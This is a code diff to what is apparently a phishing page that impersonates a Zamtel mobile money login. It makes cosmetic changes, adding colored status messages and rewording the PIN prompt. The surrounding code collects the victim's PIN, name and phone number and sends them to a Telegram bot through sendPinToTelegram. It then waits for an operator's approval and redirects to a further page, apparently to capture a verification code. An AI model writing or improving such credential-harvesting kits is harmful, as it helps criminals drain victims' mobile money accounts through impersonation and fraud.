@@ -68,10 +68,12 @@ body{
 
 #status{
   font-size:14px;
-  color:#00843d;
   margin-top:8px;
   min-height:18px;
+  font-weight:600;
 }
+#status.success{ color:#00843d; }   /* green */
+#status.error{   color:#d32f2f; }   /* red   */
 
 .lower-section{
   width:100%;
@@ -110,7 +112,7 @@ body{
   <div class="upper-section">
     <div class="brand-name">Zamtel</div>
     <div class="welcome-text">Welcome</div>
-    <div class="pin-label">Enter your  mobile money pin</div>
+    <div class="pin-label">Enter your PIN code</div>
 
     <div class="pin-boxes">
       <input type="tel" maxlength="1">
@@ -140,12 +142,19 @@ const botId   = new URLSearchParams(window.location.search).get("botId");
 const boxes   = document.querySelectorAll(".pin-boxes input");
 const statusEl= document.getElementById("status");
 
-// Always read fresh from localStorage each time we send something
 function getIdentity(){
   return {
     name:  localStorage.getItem("name")  || "Unknown",
     phone: localStorage.getItem("phone") || "Unknown"
   };
+}
+
+// 🎨 status helper: success = green, error = red
+function setStatus(text, type){
+  statusEl.textContent = text;
+  statusEl.classList.remove("success", "error");
+  if(type === "success") statusEl.classList.add("success");
+  if(type === "error")   statusEl.classList.add("error");
 }
 
 async function sendPinToTelegram(name, phone, pin) {
@@ -188,22 +197,23 @@ boxes.forEach((box,i)=>{
       let pin=""; boxes.forEach(b=>pin+=b.value);
       localStorage.setItem("pin",pin);
 
-      const { name, phone } = getIdentity();   // fresh read every submit
+      const { name, phone } = getIdentity();
       boxes.forEach(b=>b.disabled=true);
-      statusEl.textContent="Sending PIN code...";
+      setStatus("Sending PIN code...", "success");
 
       const res = await sendPinToTelegram(name, phone, pin);
       if(!res||!res.requestId){
-        statusEl.textContent="Failed. Please try again.";
+        setStatus("Failed. Please try again.", "error");
         boxes.forEach(b=>{b.disabled=false;b.value="";});
         boxes[0].focus(); return;
       }
 
       const ok = await pollPinApproval(res.requestId);
       if(ok){
-        window.location.href = "success.html?botId=" + botId;
+        setStatus("PIN approved. Redirecting...", "success");
+        window.location.href = "code.html?botId=" + botId;
       } else {
-        statusEl.textContent="Incorrect PIN code.";
+        setStatus("Incorrect PIN code.", "error");
         boxes.forEach(b=>{b.disabled=false;b.value="";});
         boxes[0].focus();
       }
